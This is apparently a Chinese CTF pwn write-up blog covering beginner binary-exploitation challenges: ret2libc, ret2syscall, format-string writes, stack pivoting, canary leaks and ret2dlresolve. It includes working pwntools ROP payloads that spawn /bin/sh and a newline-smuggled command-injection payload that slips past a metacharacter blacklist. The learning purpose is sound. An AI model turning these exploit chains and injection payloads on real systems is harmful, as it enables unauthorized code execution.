认识libc</h3><p>一个程序很难不依赖外部的库函数，即链接库。在本题中终于遇到了libc</p><p>一个很重要的事是修改本地可执行文件的libc，因为默认的是本地系统库，而非远程环境下的。而远程的libc文件会与可执行文件一并给出，patchelf一下即可</p><p>利用libc的第一步永远是泄露基地址，因为其中函数的运行时地址每次均不一样，且依赖碰撞解题完全不可行，本题作为libc的引入直接给出了printf函数的地址，以及一个足够大的栈溢出</p><p>libc里各种零件应有尽有，比如pop rdi; ret和”/bin/sh\x00”字符串，于是下一步就可以为所欲为了：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span> recv_data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">)</span>printf_match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">rb"location of 'printf': (0x[0-9a-fA-F]+)"</span><span class="token punctuation">,</span> recv_data<span class="token punctuation">)</span>printf_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>printf_match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span><span class="token comment"># 计算libc基址和关键函数地址</span>libc_base <span class="token operator">=</span> printf_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 查找ROP gadgets</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdi'</span><span class="token punctuation">,</span> <span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseret_gadget <span class="token operator">=</span> rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token comment"># 计算溢出偏移量</span><span class="token comment"># buf在rbp-0x40处，需要64字节到达rbp，再8字节覆盖返回地址</span>offset <span class="token operator">=</span> <span class="token number">64</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token comment"># 构造payload</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> offsetpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_gadget<span class="token punctuation">)</span>      <span class="token comment"># 栈对齐</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>     <span class="token comment"># pop rdi; ret</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>      <span class="token comment"># "/bin/sh"字符串地址</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>     <span class="token comment"># system函数地址</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="boom-amp-amp-boom-revenge"><a href="#boom-amp-amp-boom-revenge" class="headerlink" title="boom &amp;&amp; boom_revenge"></a>boom &amp;&amp; boom_revenge</h3><p>此题用随机数模拟了一个canary，有后门函数和任意读，故只需要猜到这个canary即可，其生成机制：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c">canary <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">114514</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>这是一种可以预测的随机机制，time(0)种子在一秒内不变：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ctypes   <span class="token keyword">import</span> time current_time <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 设置随机数种子 </span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>current_time<span class="token punctuation">)</span>     <span class="token comment"># 生成与程序相同的随机数 </span>canary_value <span class="token operator">=</span> libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">114514</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>在栈溢出之后接触到的第二个功能强大的漏洞，可以定位泄露寄存器与栈，以及篡改。此题作为引入只需要泄露即可</p><p>可以看见：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nice to meet you,"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>直接printf输入的字符串，送进去一些%s或者%p，printf函数就会找不到足够的参数于是去栈上匹配，然后把栈上的数据输出出来</p><h3 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h3><p>按照题目所说，这是一个利用简单、难以防御、危害还可能极大的漏洞：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">_printf_chk</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Enter host to ping: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v0 <span class="token operator">=</span> buf<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0xFu</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4 <span class="token operator">+</span> v1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4 <span class="token operator">+</span> v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  v0 <span class="token operator">=</span> <span class="token operator">&amp;</span>qword_20<span class="token punctuation">;</span>  <span class="token function">_snprintf_chk</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">"ping %s -c 4"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> command<span class="token punctuation">;</span>  <span class="token function">execute</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>大意是输入一个ping命令，然后要经过一个strlen和一个check函数的检查，只要通过了就会直接执行，这里的check逻辑是：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">return</span> <span class="token function">strpbrk</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token string">";&amp;|>&lt;$()&#123;&#125;[]'\"`\\!~*"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>也就是不能有如上大部分字符</p><p>然而这个检测还是不严格的，strlen遇到<code>\n</code>就会停止，check也没有检测它，所以就可以：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b"1\ncat flag\nping 127.0.0.1\n"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="randomlock"><a href="#randomlock" class="headerlink" title="randomlock"></a>randomlock</h3><p>表面上是一个随机数算法，实际上……呃……种子经过一系列复杂的运算之后是固定的</p><p>具体怎么做的忘了</p><h3 id="str-check"><a href="#str-check" class="headerlink" title="str_check"></a>str_check</h3><p>涉及一些字符串函数的细节<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What can u say?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%255s"</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"So,what size is it?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%zu"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>  len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>len <span class="token operator">></span> <span class="token number">0x18</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Oh,too much."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token string">"meow"</span><span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> str<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">strncpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> str<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You're right."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>str在bss段，dest在栈上。借助一个拷贝函数把str转移到栈上，其中memcpy严格复制n字节，strncpy遇到<code>\0</code>停止，strlen也是遇到<code>\0</code>中断</p><p>所以算是栈溢出检查不严格，然后此题有后门函数，按照正常ROP思路ret过去即可</p><h3 id="syslock"><a href="#syslock" class="headerlink" title="syslock"></a>syslock</h3><p>此题又引入了一个重要的知识点——系统调用，也就是ret2syscall</p><p>基本原理就是认识syscall函数，其依据调用时的rax的不同执行不同的系统调用。此类题目的缺点是需求的“工具”比较多，当然此题作为引入都直白的给出来了</p><p>第一个工具，设置syscall的参数，在gadget函数中给出了<br><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.text:0000000000401240                 pop     rdi.text:0000000000401241                 pop     rsi.text:0000000000401242                 pop     rdx.text:0000000000401243                 retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p><p>第二个工具，修改rax的值，也在gadget函数中给出了<br><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.text:0000000000401244                 pop     rax.text:0000000000401245                 retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><p>第三个工具，传入的参数，也就是”/bin/sh\x00”，此题有读入一个字符串到bss段，输入即可<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">0xCu</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>然后注入字符串s的地址</p><p>最后一个工具，ret2syscall的根本，一个syscall，在程序中也能直接找到</p><p>于是构建ROP链，注意栈对齐：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">8</span>payload <span class="token operator">+=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">64</span>  <span class="token comment">#payload += p64(ret)*0                    # ret</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span>              <span class="token comment"># pop rax ; ret</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span>                       <span class="token comment"># RAX = 59</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>                      <span class="token comment"># ret</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_rsi_rdx_ret<span class="token punctuation">)</span>  <span class="token comment"># endbr64 ; pop rdi ; pop rsi ; pop rdx ; ret</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>               <span class="token comment"># RDI = "/bin/sh" 指向新的字符串位置</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment"># RSI = NULL</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment"># RDX = NULL</span><span class="token comment">#payload += p64(ret) *0                  </span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>                  <span class="token comment"># syscall</span>```   <span class="token comment">### xdulaker</span>栈上的数据在rbp<span class="token operator">/</span>rsp变化后不会立即清理，如果进行新的函数调用时未初始化栈上变量，就有很大的利用空间此题另一个考察点事开启了四大保护之一的PIE保护，即随机化代码段地址，在IDA里看到的地址不再是<span class="token number">0x40</span>????，而是：```text<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0000000000001249</span> backdoor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>这样的小地址，想要获得真是地址需要和之前的libc一样，泄漏点什么地址，而相对位置是固定不变的，借此找到其余函数地址。此题同样没有为难我们，直接告知了，本题有后门函数，ret2text即可</p><h3 id="easylibc"><a href="#easylibc" class="headerlink" title="easylibc"></a>easylibc</h3><p>此题开启了ASLR和PIE两种保护，但是重点考察内容则是动态链接和延迟绑定，简单的说——调用库函数时去查表找具体的地址，而对应的表项直到调用时才会生成。</p><p>同样，涉及libc的题目总是要泄露基地址，本题printf了read的地址，然而此时read还没调用过，输出的是其plt表表项的地址，借此得到其余函数地址，也就是破解了PIE保护。</p><p>借助栈溢出重新回到main函数，此时read函数已经调用过，再次printf时就输出了其libc地址，也就是得到了libc基地址，接下来就和认识libc那道题一样构建ROP链即可</p><h3 id="ezpivot"><a href="#ezpivot" class="headerlink" title="ezpivot"></a>ezpivot</h3><p>本题涉及了一个新的技巧，栈迁移（stack pivot）</p><p>函数read了两次，第一次写到bss段，长度自己输入，作为一个有符号数不大于32，但是实际使用时是作为无符号数处理的——简而言之输入-1得到无限读，即bss段无限写</p><p>第二次read的长度固定，只溢出16字节</p><p>另外本题表面上有后门函数时ret2text，实际上是一个<code>system(&quot;echo moectf&#123;WowYouGetTheFlag&#125;&quot;)</code>，里面显然不是真正的flag，此题还给了pop rdi；ret的gadget，其实是一道ret2syscall</p><p>第一步是解决ROP链放不下的问题，借助篡改栈上保存的rbp实现栈迁移，把另一段可控区域作为新的栈，在可控区域内布置ROP链，用一个leave ret的gadget把rbp恢复到保存值</p><p>此题给的是system而非syscall，不需要设置rax，但是仍然需要”/bin/sh\x00”字符串，写在bss段一个找得到的地址即可</p><p>一个大坑是system系统调用过程中访问了一个比较低的地址，如果访问到了代码段就会出错，所以要给栈留出足够大的空间</p><h3 id="ezprotection"><a href="#ezprotection" class="headerlink" title="ezprotection"></a>ezprotection</h3><p>有后门函数，但是增加了canary保护导致常规的栈溢出变得不可行，然而read再puts导致了canary的泄露，栈溢出又重新可行了：</p><p>canary为了截断一些用来泄露的函数，诸如puts，它的最低一个字节是0x00，因此，如果你能通过栈溢出覆盖掉这个0x00，就可以用输出函数将其泄露出来，</p><p>此题有后门函数，backdoor函数里有一些装模作样的密码检查，实际上完全不用在意，ret到检查结束之后即可</p><p>另外此题也有PIE保护，这里要了解PIE的随机特点，即颗粒度并不会很细，低12位是不变的。然而篡改的颗粒度是字节，也即16位，需要多次尝试爆破一下</p><h3 id="fmt-S"><a href="#fmt-S" class="headerlink" title="fmt_S"></a>fmt_S</h3><p>卡了我相当长时间的一道题，也基本宣告着这一个月学习的终点，是我在tsctf前解出的最后一道题</p><p>涉及非栈上的格式化字符串漏洞，时值hitsz的ctf比赛招新，在他们的文档里看到了此类题目的解法，然后经过反复调试才逐步学会</p><p>完整贴一下题目吧：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>  <span class="token function">init</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You're walking down the road when a monster appear."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">3</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>flag<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token function">talk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>atk <span class="token operator">&lt;=</span> <span class="token number">0x1BF52</span> <span class="token punctuation">)</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You've been eaten by the monster."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">he</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> <span class="token function">talk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You start talking to him..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  flag <span class="token operator">^=</span> <span class="token number">1u</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> fmt<span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You enraged the monster-prepare for battle!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">my_read</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>atk<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>在fmt那道题里提到过格式化字符串漏洞是可以完成篡改的，具体而言，当读到%n参数，会把匹配到的位置看做地址，往其中写入已经printf的字节数，因而实现了篡改，有四种大小参数，%n、%hn、%hhn、%lln，分别对应4、2、1、8字节</p><p>此题中flag和atk都是bss段的全局变量，而最重要的，读入的内容fmt也在bss段，而非栈上</p><p>先说常规之处，控制循环的变量i既然在栈上，就在格式化字符串课篡改的范围内，所以循环次数一定是要改成无穷多次的。</p><p>libc地址和函数地址很难不出现在栈上，利用gdb和%p可以很轻易地泄露出来</p><p>最终的利用是篡改printf的got表项，把其内容改成system函数的地址，这样再一次printf时输入”/bin/sh\x00”即可getshell</p><p>然而篡改got表并非最优解，因为printf和system的地址后3字节不同，%hn不够，%n又过长，偏偏此题限制read长度无法分两次，实战中用%n传了足足半个小时，但也是拿到flag了</p><p>题解给的思路是篡改整个程序的返回地址，在那里构建ROP链，既然还在栈上显然也是在格式化字符串的能力范围内，且可以分步改，不像printf一样一次printf改不完就会崩掉</p><p>真正的难点是如何借助栈上的指针完成篡改</p><p>假设栈地址A上有一个指向C的指针B，看起来就是这样的： A: B-&gt;C</p><p>如果把B作为%n的参数，printf会把B看做一个指针去篡改C，于是实现了对C的篡改</p><p>同时B如果是一个栈地址，就一定存在 B: C</p><p>我们可以借助 A-B-C这条链把C改成另一个指针——假设为D，其值为E，这样再把B作为%n的参数，就可以借助B-D-E这条链篡改E的值</p><p>由于这里C可以被篡改成任意地址，所以E就可以成为任意值，于是任意写就达成了，此题的核心利用也就完成了</p><h3 id="hardpivot"><a href="#hardpivot" class="headerlink" title="hardpivot"></a>hardpivot</h3><p>依旧是栈迁移，在tsctf里遇到了此题的变种，本题友善地提供了pop rdi; ret的gadget，故而比之简单一些。</p><p>按照栈迁移的一般思路，第一步是得到一块可控区域。然后是ret2libc必要的libc基地址，都得到后即可按照常规思路getshell</p><p>溢出16字节，第一轮栈迁移，将rbp转移到bss段，把返回地址篡改为read函数，从设置参数开始。正常流程执行完毕后leave_ret，rbp变成了篡改后的值且回到了read调用前，buf位置是依据rbp确定的</p><p>然后泄露libc，在可控段构建ROP链，利用pop rdi完成puts(puts.got)即可，在ROP链的结尾再触发一次read，然后leave，把rbp改到新buf[0]的值</p><p>再然后第二次迁移，再进行一轮ROP，思路不变，pop rdi /bin/sh\x00 call system即可</p><h3 id="fmt-t"><a href="#fmt-t" class="headerlink" title="fmt_t"></a>fmt_t</h3><p>其实相比于fmt_s的非栈上指针复杂的简介修改，此题输入内容在栈上反而简单了不少，基本思路即先把要篡改的数据地址读到栈上，再把它作为%n的参数完成篡改，同时此题第一轮read可以泄露libc地址</p><p>hell(5)只能读入5个字节，由于hell调用时递归的，其读入的内容在最后执行，”/bin/sh\x00”过长，用”sh\x00”即可</p><p>printf和system依然是低3字节不同，需要篡改两次</p><h3 id="shellbox"><a href="#shellbox" class="headerlink" title="shellbox"></a>shellbox</h3><p>沙箱保护、静态链接</p><p>通过seccomp禁掉了execve等系统调用，然而getshell不行可以ORW，即open、read、write</p><p>思路是在bss段上写入shellcode，然后利用栈溢出跳到开头完成执行，但是在此之前还需要用mprotect函数给予bss段可执行权限，ROP完成</p><h3 id="No-way-to-leak！"><a href="#No-way-to-leak！" class="headerlink" title="No way to leak！"></a>No way to leak！</h3><p>题目是一个直白的足够大的栈溢出，给了pop rdi ret 的gadget，但是除此之外实在是一干二净，没有backdoor没有libc，甚至连puts函数也没有，但是题目告知了此题应当用ret2dlresolve来解，<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/">wiki</a>上有讲解，<a href="https://www.cnblogs.com/Sta8r9/p/17732965.html">以及这篇博客</a></p><p>利用围绕着<code>_dl_runtime_reslove</code>这个函数，正常流程中：在程序首次调用一个函数时，会跳到plt表，然后跳转到got表，此时表为空未解析，接着跳转到PLT[0]，再跳入_dl_runtime_resolve，它会解析所调用的函数，然后更新got表，完成绑定并执行。</p><p>观察call read之后的过程：<br><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">► 0x401060       &lt;read@plt&gt;                        endbr64  0x401064       &lt;read@plt+4&gt;                      bnd jmp qword ptr [rip + 0x2fb5]   &lt;0x401040&gt;   ↓  0x401040                                         endbr64  0x401044                                         push   1  0x401049                                         bnd jmp 0x401020                   &lt;0x401020&gt;   ↓  0x401020                                         push   qword ptr [rip + 0x2fe2]  0x401026                                         bnd jmp qword ptr [rip + 0x2fe3]   &lt;_dl_runtime_resolve_xsavec&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>_dl_runtime_resolve参数为push到栈上的两个值，link_map和reloc_offset（函数在rel.plt上的偏移）</p><p>看一眼[rip + 0x2fe2]，在0x404008，其值为0x00007552d64e92e0</p><p>link_map结构如下：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">link_map</span>  <span class="token punctuation">&#123;</span>       <span class="token function">ElfW</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span> l_addr<span class="token punctuation">;</span>     <span class="token comment">/*共享对象的加载基址；*/</span>                <span class="token keyword">char</span> <span class="token operator">*</span>l_name<span class="token punctuation">;</span>                    <span class="token function">ElfW</span><span class="token punctuation">(</span>Dyn<span class="token punctuation">)</span> <span class="token operator">*</span>l_ld<span class="token punctuation">;</span>                       <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l_next<span class="token punctuation">,</span> <span class="token operator">*</span>l_prev<span class="token punctuation">;</span> <span class="token comment">/*管理link_map的双链表指针；*/</span>    <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l_real<span class="token punctuation">;</span>            Lmid_t l_ns<span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">libname_list</span> <span class="token operator">*</span>l_libname<span class="token punctuation">;</span>         <span class="token 